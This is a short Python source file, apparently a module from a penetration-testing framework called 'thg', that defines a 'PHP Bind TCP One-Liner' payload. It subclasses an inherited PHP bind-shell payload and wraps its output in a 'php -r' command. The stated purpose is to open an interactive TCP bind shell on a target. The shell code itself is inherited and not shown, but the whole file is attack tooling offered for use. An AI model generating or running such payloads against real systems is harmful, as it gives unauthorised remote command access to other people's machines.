from thg.core.exploit import *
from thg.modules.payloads.php.bind_tcp import Payload as PHPBindTCP


class Payload(PHPBindTCP):
    __info__ = {
        "name": "PHP Bind TCP One-Liner",
        "description": "Creates interactive tcp bind shell by using php one-liner.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # thg module
        ),
    }

    cmd = OptString("php", "PHP binary")

    def generate(self):
        self.fmt = self.cmd + ' -r "{}"'
        payload = super(Payload, self).generate()
        return payload
